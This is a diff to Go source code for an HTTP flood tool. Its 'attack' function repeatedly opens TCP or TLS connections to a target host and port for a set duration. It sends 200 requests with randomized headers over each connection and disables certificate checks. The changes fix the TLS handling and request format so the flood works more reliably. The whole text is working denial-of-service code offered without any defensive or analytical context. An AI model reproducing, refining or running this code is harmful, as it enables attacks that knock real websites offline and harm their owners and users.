@@ -84,33 +84,45 @@ func getuseragent() string {
 }
 
 func getheader() string {
-	connection := "Connection: Keep-Alive\r\n"
+	connection := "Connection: keep-alive\r\n"
 	accept := acceptall[rand.Intn(len(acceptall))]
 	referer := "Referer: " + "https://" + ip + "/" + "\r\n"
 	useragent := "User-Agent: " + getuseragent() + "\r\n"
-	header := connection + useragent + accept + referer + "\r\n"
+	header := useragent + connection + accept + referer + "\r\n"
 	return header
 }
 
 func attack(ip string, path string, port int, duration int) {
-	get_host := "POST " + path + " HTTP/1.1\r\nHost: " + ip + ":" + strconv.Itoa(port) + "\r\n"
+	get_host := fmt.Sprintf("GET %s HTTP/1.1\r\nHost:%s:%d\r\n", path, ip, port)
 	startTime := time.Now()
 	endTime := startTime.Add(time.Duration(duration) * time.Second)
 	for time.Now().Before(endTime) {
-		conn, _ := net.Dial("tcp", fmt.Sprintf("%s:%d", ip, port))
+		conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", ip, port))
+		if err != nil {
+			fmt.Println("\r\nError connecting:", err)
+			return
+		}
+		defer conn.Close()
 		if port == 443 {
-			cfg := &tls.Config{
-				InsecureSkipVerify: true,
-				ServerName:         ip, //simple fix
+			tlsConfig := &tls.Config{
+				InsecureSkipVerify: true, // Skip certificate verification (not recommended for production)
+				ServerName:         ip,
 			}
-			conn, _ = tls.Dial("tcp", fmt.Sprintf("%s:%d", ip, port), cfg)
+			// Wrap the connection with TLS
+			tlsConn := tls.Client(conn, tlsConfig)
+			if err := tlsConn.Handshake(); err != nil {
+				fmt.Println("\r\nTLS handshake error:", err)
+				return
+			}
+
+			for i := 0; i < 200; i++ {
+				tlsConn.Write([]byte(get_host + getheader()))
+			}
+			tlsConn.Close()
+		} else {
 			for i := 0; i < 200; i++ {
 				conn.Write([]byte(get_host + getheader()))
 			}
-			conn.Close()
-		}
-		for i := 0; i < 200; i++ {
-			conn.Write([]byte(get_host + getheader()))
 		}
 		conn.Close()
 		time.Sleep(1 * time.Millisecond)
